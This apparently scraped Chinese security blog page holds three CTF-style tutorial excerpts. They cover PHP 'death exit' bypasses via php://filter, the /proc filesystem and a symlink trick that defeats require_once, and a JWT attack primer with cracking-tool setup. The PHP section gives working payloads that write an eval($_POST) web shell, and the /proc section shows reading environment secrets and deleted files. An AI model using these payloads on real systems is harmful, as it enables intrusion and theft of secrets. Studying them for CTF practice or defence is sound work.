-<h3 id="绕过死亡exit"><a href="#绕过死亡exit" class="headerlink" title="绕过死亡exit"></a>绕过死亡exit</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
-
-<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。那么这种情况下，如何绕过这个<code>“死亡exit”</code>？</p>
-<p>思路其实也很简单我们只要将<code>content</code>前面的那部分内容使用某种手段（编码等）进行处理，导致<code>php</code>不能识别该部分就可以了。</p>
-<p>这里的<code>$_POST[‘filename’]</code>是可以控制协议的.</p>
-<h4 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h4><p>当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用<code>php://filter/write=convert.base64-decode</code>来首先对其解码。在解码的过程中，字符<code>&lt; ? ; &gt;</code>空格等一共有7个字符不符合<code>base64</code>编码的字符范围将被忽略，所以最终被解码的字符仅有<code>”phpexit”</code>和我们传入的其他字符。</p>
-<p>由于，<code>”phpexit”</code>一共7个字符，但是<code>base64</code>算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符。这样前边的<code>phpexit</code>加上另一个字符就会被<code>base64</code>解码，然后后边的我们精心构造的<code>base64</code>字符串也会被成功解码为php代码。</p>
-<p>payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span></span><br></pre></td></tr></table></figure>
-
-<p>成功写入</p>
-<p><img src="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1732422269598-3546f0cf-d3fc-4ef8-a023-26df40911863.png"></p>
-<h4 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h4><p>利用<code>php://filter</code>中<code>string.rot13</code>过滤器去除<code>”exit”</code>。<code>string.rot13</code>的特性是编码和解码都是自身完成，利用这一特性可以去除<code>exit</code>。 <code>&lt;?php exit;?&gt;</code> 在经过<code>rot13</code>编码后会变成 <code>&lt;?cuc rkvg();?&gt;</code> ，不过这种利用手法的前提是PHP不开启<code>short_open_tag/</code></p>
-<p><img src="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/1732422269762-516e494c-c04d-4835-b0ec-20ba87d0fdb2.png"></p>
-<p>虽然官方说的默认开启，但是在<code>php.ini</code>中默认是注释掉的，也就是说它还是默认关闭。</p>
-<p>payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[n]);</span></span><br></pre></td></tr></table></figure>
-
-<p>成功写入文件 2.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc <span class="title function_ invoke__">rkvg</span>();<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);</span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/26/phpfilter%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87---base64%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-[CTF]proc目录的应用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="proc目录的运用"><a href="#proc目录的运用" class="headerlink" title="proc目录的运用"></a>proc目录的运用</h2><h3 id="proc目录"><a href="#proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h3><p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p>
-<p>简单来讲，<code>/proc</code> 目录即保存在系统内存中的信息，大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。</p>
-<p>&#x2F;proc 目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号(PID)，里面包含对应进程相关的多个信息文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/26/[CTF]proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/1742193363519-219aa542-2f3b-4379-897a-603201df55e4.png"></p>
-<p>每一个进程对应许多相关文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/26/[CTF]proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/1742193363459-3da93db0-0e51-4066-bbd3-d8b46e0a6326.png"></p>
-<p>一些常见的进程文件：</p>
-<h4 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h4><p>cmdline 文件存储着启动当前进程的完整命令，但<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B&spm=1001.2101.3001.7020">僵尸进程</a>目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/2889/cmdline</span><br></pre></td></tr></table></figure>
-
-<h4 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=cwd&spm=1001.2101.3001.7020">cwd</a></h4><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录（也就是这个是在那个目录下执行的）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289/cwd</span><br></pre></td></tr></table></figure>
-
-<p>之后我们可以使用ls查看该运行目录下的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /proc/1289/cwd</span><br></pre></td></tr></table></figure>
-
-<h4 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h4><p>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289/exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/26/[CTF]proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/1742193571672-7d183f38-c7b4-4b3e-98a0-19e29c4556ae.png"></p>
-<h4 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h4><p>environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/2889/environ</span><br></pre></td></tr></table></figure>
-
-<p>常用以读取环境变量中的SECRET_KEY或FLAG</p>
-<h4 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h4><p>fd 是一个目录，里面包含着当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。</p>
-<p>查看指定进程打开的某个文件的路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289/fd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/26/[CTF]proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/1742193363608-7e1e2c5c-8799-4b9f-b7fe-ea98adc80057.png"></p>
-<p>查看指定进程打开的某个文件的内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/1289/fd/4</span><br></pre></td></tr></table></figure>
-
-<p><strong>在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p>
-<h4 id="self"><a href="#self" class="headerlink" title="self"></a>self</h4><p><code>/proc/self</code> 表示当前进程目录。我们可以通过<code>/proc/$pid/</code>来获取指定进程的信息，这个方法需要知道进程pid。为了更方便的获取本进程的信息，linux提供了<code>/proc/self</code>目录，等价于<code>/proc/本进程pid</code>。</p>
-<ul>
-<li>获取当前启动进程的完整命令：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/cmdline</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>获取目标当前进程环境的运行目录与目录里的文件：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/self/cwd</span><br><span class="line">ls /proc/self/cwd</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>获取当前进程的可执行文件的完整路径：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc/self/exe</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>获取当前进程的环境变量</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/environ</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>获取当前进程打开的文件内容</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/fd/&#123;id&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="PHP文件包含：使用多级软链接绕过文件判断"><a href="#PHP文件包含：使用多级软链接绕过文件判断" class="headerlink" title="PHP文件包含：使用多级软链接绕过文件判断"></a>PHP文件包含：使用多级软链接绕过文件判断</h3><p>如何通过require_once来多次包含同一个文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &#x27;/www/config.php&#x27;;</span><br><span class="line">// some logic here...</span><br><span class="line">require_once $_GET[&#x27;file&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>场景描述：我们在审计时找到一处<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">文件包含漏洞</a>（使用require_once或include_once），想利用这个漏洞读取一下数据库配置文件之类的源码，通常可以使用<code>php://filter/convert.base64-encode/resource=file</code>这样的方式将文件以base64的形式读出来。但如果这个文件在前面已经被包含过了，则第二次包含就会失败，即使使用<code>php://filter</code>也一样。</p>
-<p>此时我们可以使用“多重软连接”，正常情况下，PHP会将用户输入的文件名进行resolve，转换成标准的绝对路径，这个转换的过程会将…&#x2F;、.&#x2F;、软连接等都进行计算，得到一个最终的路径，再进行包含。每次包含都会经历这个过程，所以，只要是相同的文件，不管中间使用了…&#x2F;进行跳转，还是使用软连接进行跳转，都逃不过最终被转换成原始路径的过程，也就绕不过require_once。</p>
-<p>但是，如果软连接跳转的次数超过了某一个上限，Linux的lstat函数就会出错，导致PHP计算出的绝对路径就会包含一部分软连接的路径，也就和原始路径不相同的，即可绕过require_once限制。 在Linux下，最常见的软连接就是&#x2F;proc&#x2F;self&#x2F;root，这个路径指向根目录。所以，我们可以多次使用这个路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &#x27;/www/config.php&#x27;;</span><br><span class="line">include_once &#x27;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/www/config.php&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>这样即可包含两次&#x2F;www&#x2F;config.php。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2025/03/26/%5BCTF%5Dproc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%BA%94%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-JWT攻击" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12906?time__1311=GqGxuD9QiQGQdGN4CxUE=QG8i634Y5r3x&u_atoken=eeda24ac15063dd11615c65e5362ada0&u_asig=1a0c39a017283574289661729e0133#toc-0">JWT渗透姿势一篇通 - 先知社区 (aliyun.com)</a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h3><p>JSON Web Token (JWT) 是一种标准化格式，用于在系统之间发送加密签名的 JSON 数据。它们理论上可以包含任何类型的数据，但最常用于发送有关用户信息的声明，作为身份验证、会话处理和访问控制机制的一部分。</p>
-<p>与经典会话令牌不同，服务器需要的所有数据都存储在 JWT 本身的客户端中。这使得 JWT 成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。</p>
-<p>它一般会放置在<strong>Authorization</strong>、<strong>Cookie</strong>或者请求体里面。</p>
-<h3 id="JWT有什么用"><a href="#JWT有什么用" class="headerlink" title="JWT有什么用"></a>JWT有什么用</h3><p>JWT 最常见的场景就是授权认证，一旦用户登录，后续每个请求都将包含 JWT，系统在每次处理用户请求的之前，都要先进行 JWT 安全校验，通过之后再进行处理。主要用于验证用户身份信息及跨域的身份验证。</p>
-<h3 id="为什么引入JWT"><a href="#为什么引入JWT" class="headerlink" title="为什么引入JWT"></a>为什么引入JWT</h3><p>弥补session认证。</p>
-<p>在传统的web应用中，我们通常采用session认证：</p>
-<p><strong>session认证流程：</strong></p>
-<p>1.客户端将用户名&#x2F;密码通过某种加密的方式发送给服务器</p>
-<p>2.服务器接收到客户端请求之后进行验证，验证通过后使用Set-Cookie将用户的唯一	session id放入到cookie当中，并将生成的session id和用户的关联信息存入到内存。</p>
-<p>3.客户端第二次访问后服务器从当前cookie中取出session id并从内存中拿到相同的session id，如果不存在，或者没有携带session id则说明该用户登陆过期，或者未登陆。</p>
-<p><strong>session认证的一些缺点：</strong></p>
-<p>1.由于使用session进行认证的方式必须存储sessionid，当用户量过大时对服务器内存消耗影响巨大。如果你没有设置session的过期时间（关闭浏览器并不会导致cookie消失），那么对你的服务器来说消耗是致命的。</p>
-<p>2.如果你没有将session存在一个所有服务器都可以获取得到的地方，如redis。那么意味着在本台服务器上面存储的sessionid其他服务器无法获取。用户进行请求时必须请求到这台服务器上面。可扩展性较差。</p>
-<p>3.跨平台性较差，传统的session认证方式在移动端很难行得通。你必须开发二套不同的逻辑对web和移动端进行认证。</p>
-<p><strong>jwt认证流程：</strong></p>
-<p>1.客户端将用户名&#x2F;密码通过某种加密的方式发送给服务器。</p>
-<p>2.服务器接收到客户端请求后进行验证，验证通过服务器生成token返回给客户端。客户端将token存储在本地。</p>
-<p>3.客户端每次请求将token携带在http header头中， 服务器端将token取出进行解密。</p>
-<hr>
-<p><strong>jwt认证的优点：</strong></p>
-<p>1.服务器端无需保存token，以加解密的方式代替存储，节省了内存空间。</p>
-<p>2.无状态的token不依赖于服务器保存会话信息，更利于水平扩展。</p>
-<p>3.相比于传统的session认证方式，jwt对移动端的支持更友好。</p>
-<h3 id="JWT的组成"><a href="#JWT的组成" class="headerlink" title="JWT的组成"></a>JWT的组成</h3><p>JWT由三部分组成，用.拼接。举例如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>
-
-<p>使用专业网站：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 或者 <a target="_blank" rel="noopener" href="https://token.dev/">https://token.dev/</a>（不常用）</p>
-<p>JWT由三部分构成：</p>
-<p><strong>第一部分我们称它为头部（header)，是一个 JSON 对象。</strong></p>
-<blockquote>
-<p>头部是用来声明此jwt的类型和加密算法，它们通常由alg和typ这二个字段组成。</p>
-</blockquote>
-<p>alg字段通常用于表示加密采用的算法。如“HS256”、“RS256”等</p>
-<p>typ字段通常用于表示类型</p>
-<p>还有一些其他可选参数，如“kid”、“jku”、“ x5u”等</p>
-<p><strong>第二部分我们称其为载荷（payload)，是一个 JSON 对象。</strong></p>
-<p>主要承载了各种声明并传递明文数据，一般用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明。</p>
-<p>iss：该字段表示jwt的签发者。可以用你的应用唯一标识或者高权限的userid填充此字段。</p>
-<p>sub：该jwt面向的用户。</p>
-<p>aud：jwt的接收方。</p>
-<p>exp：jwt的过期时间,通常来说是一个时间戳。</p>
-<p>iat：jwt的签发时间,常来说是一个时间戳。</p>
-<p>jti：此jwt的唯一标识。通常用于解决请求中的重放攻击。该字段在大多数地方没有被提及或使用。因为使用此字段就意味着必须要在服务器维护一张jti表， 当客户端携带jwt访问的时候需要在jti表中查找这个唯一标识是否被使用过。使用这种方式防止重放攻击似乎让jwt有点怪怪的感觉, 毕竟jwt所宣称的优点就是无状态访问</p>
-<p><strong>第三部分是签证（signature)</strong></p>
-<p>Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header的alg 中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。</p>
-<p><img src="/2025/03/26/JWT%E6%94%BB%E5%87%BB/1726647379495-4c974c11-713e-483a-8bfb-67a3c726dd3c.png"></p>
-<p>阅读 JWT 的第三部分，可以得知 JWT 是怎么来了：</p>
-<p>第一部分：对 JSON 的头部做 base64 编码处理得到</p>
-<p>第二部分：对 JSON 类型的 payload 做 base64 编码处理得到</p>
-<p>第三部分：</p>
-<p>1.分别对头部和载荷做base64编码，并使用.拼接起来</p>
-<p>2.使用头部声明的加密方式，对base64编码前两部分合并的结果加盐加密处理，作为 JWT 第三部分</p>
-<p><strong>在大多数情况下，任何有权访问令牌的人都可以轻松读取或修改此数据。因此，任何基于 JWT 的机制的安全性都严重依赖于加密签名。</strong></p>
-<h3 id="JWT-特征识别"><a href="#JWT-特征识别" class="headerlink" title="JWT 特征识别"></a>JWT 特征识别</h3><p>一般会放置在Authorization、Cookie或者请求体里面。</p>
-<p>以eyJ开头，.分割成三部分。对应检测的正则如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(eyJ[A-Za-z0-9_-]&#123;<span class="number">10</span>,&#125;\.[A-Za-z0-<span class="number">9.</span>_-]&#123;<span class="number">10</span>,&#125;|eyJ[A-Za-z0-9_\/+-]&#123;<span class="number">10</span>,&#125;\.[A-Za-z0-<span class="number">9.</span>_\/+-]&#123;<span class="number">10</span>,&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>可以通过HaE插件很方便的识别</p>
-<p><img src="/2025/03/26/JWT%E6%94%BB%E5%87%BB/1726647540729-ad38e2c7-b1a1-4b2d-b1ad-51224b13d04a.png"></p>
-<h3 id="JWT、JWS与JWE"><a href="#JWT、JWS与JWE" class="headerlink" title="JWT、JWS与JWE"></a>JWT、JWS与JWE</h3><p>JWT规范的约束实际上是非常有限的。因为它只定义了将信息（“声明”）表示为可以在双方之间传输的JSON对象的格式。在实际使用中，JWT并没有真正作为一个独立的实体使用。JWT规范由JSON Web签名(JWS)和JSON Web加密(JWE)规范组成，共同定义了实际实现JWT的具体方法。</p>
-<p><img src="/2025/03/26/JWT%E6%94%BB%E5%87%BB/1726647753654-a7df19f8-c559-4a06-9c8a-25848b9a0042.png"></p>
-<p>也就是说，JWT通常是指JWS或JWE令牌，JWE同理，只是令牌的实际内容是经过加密的。</p>
-<p>简单来说就是：jws(JSON Web Signed)并没有对数据进行加密，如果我们想保证数据的安全就需要使用jwe(JSON Web Encryption)对jwt进行加密。</p>
-<p>关于这一点，更进一步的解释参见：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fCyOEJvDqtxObO1GXT_iUA">一文读懂JWT,JWS,JWE</a></p>
-<h3 id="生成JWT"><a href="#生成JWT" class="headerlink" title="生成JWT"></a><font style="color:rgb(79, 79, 79);">生成JWT</font></h3><p><font style="color:rgb(77, 77, 77);">Python生成Jwt Web Token：</font></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;jwt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: time.time(),</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用jwt库，生成json web token</span></span><br><span class="line"><span class="comment">#                                秘钥      加密算法</span></span><br><span class="line">jwt_token = jwt.encode(payload, <span class="string">&quot;1121&quot;</span>, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=head)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br><span class="line">运算结果：</span><br><span class="line">eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2Njg2NTI3NjguMzE2MjY5MiwibmFtZSI6ImFkbWluIn0.CfR27zXtS7CUf99AkEG4LroIT19dKdgPmqcrTC7sD3o</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id><a href="#" class="headerlink" title></a></h3><h2 id="攻击工具"><a href="#攻击工具" class="headerlink" title="攻击工具"></a>攻击工具</h2><h3 id="爆破密钥工具："><a href="#爆破密钥工具：" class="headerlink" title="爆破密钥工具："></a>爆破密钥工具：</h3><h4 id="jwtcrack"><a href="#jwtcrack" class="headerlink" title="jwtcrack"></a>jwtcrack</h4><p><font style="color:rgb(77, 77, 77);">使用C语言编写的爆破工具，基于计算机的算力爆破的，并非基于密码本爆破。</font><br><font style="color:rgb(77, 77, 77);">项目地址：</font></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
-<p><font style="color:rgb(77, 77, 77);">安装：</font></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker.git</span><br><span class="line">cd c-jwt-cracker</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726648058187-f246ed25-93df-4e89-b361-be117a77dc2b.png"></p>
-<h3 id="综合利用工具—jwt-tool"><a href="#综合利用工具—jwt-tool" class="headerlink" title="综合利用工具—jwt_tool"></a>综合利用工具—jwt_tool</h3><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p>jwt_tool是一款用于验证、伪造、扫描和篡改 JWT的综合性工具</p>
-<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
-<p>它的功能包括：</p>
-<ul>
-<li>检查令牌的有效性</li>
-<li>测试已知漏洞：<ul>
-<li>(CVE-2015-2951) _alg&#x3D;none_签名绕过漏洞</li>
-<li>(CVE-2016-10555) _RS&#x2F;HS256_公钥不匹配漏洞</li>
-<li>(CVE-2018-0114)_密钥注入_漏洞</li>
-<li>(CVE-2019-20933&#x2F;CVE-2020-28637)_空白密码_漏洞</li>
-<li>(CVE-2020-28042)_空签名_漏洞</li>
-</ul>
-</li>
-<li>扫描错误配置或已知弱点</li>
-<li>模糊声明值以引发意外行为</li>
-<li>测试秘密&#x2F;密钥文件&#x2F;公钥&#x2F;JWKS 密钥的有效性</li>
-<li>通过字典爆破密钥</li>
-<li>伪造新的令牌标头和有效负载内容并使用密钥或通过其他攻击方法创建新签名</li>
-<li>时间戳篡改</li>
-<li>RSA 和 ECDSA 密钥生成和重建（来自 JWKS 文件）</li>
-<li>…还有更多！</li>
-</ul>
-<p>关于上述功能，以及工具的使用细节，参考这里：<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool/wiki">https://github.com/ticarpi/jwt_tool&#x2F;wiki</a></p>
-<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>安装：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install termcolor cprint pycryptodomex requests</span><br><span class="line">git clone https://github.com/ticarpi/jwt_tool.git</span><br><span class="line">cd jwt_tool</span><br></pre></td></tr></table></figure>
